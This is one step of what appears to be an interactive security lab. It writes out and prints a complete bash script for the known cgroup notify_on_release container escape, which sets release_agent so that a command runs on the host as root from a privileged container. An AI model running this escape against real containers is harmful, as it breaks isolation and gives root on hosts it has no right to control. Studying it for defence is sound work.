## Step 11: Test cgroup escape

```bash
# Conceptual: cgroup escape technique
cat > /tmp/cgroup-escape-concept.sh << 'EOF'
#!/bin/bash
# Conceptual container escape via cgroup

# 1. In privileged container
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. Create child cgroup
mkdir /tmp/cgrp/x

# 3. Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 4. Set release_agent to execute on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 5. Create script to execute
echo '#!/bin/sh' > /cmd
echo 'ps aux > /output' >> /cmd
chmod +x /cmd

# 6. Trigger release_agent (runs on host!)
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Result: Command executed on host as root!
EOF

cat /tmp/cgroup-escape-concept.sh

echo ""
echo "This is a known container escape technique"
echo "Requires privileged container"
echo "Exploits cgroup notify_on_release feature"
```{{exec}}

The cgroup notify_on_release escape is a well-known technique that executes commands on the host from a privileged container.
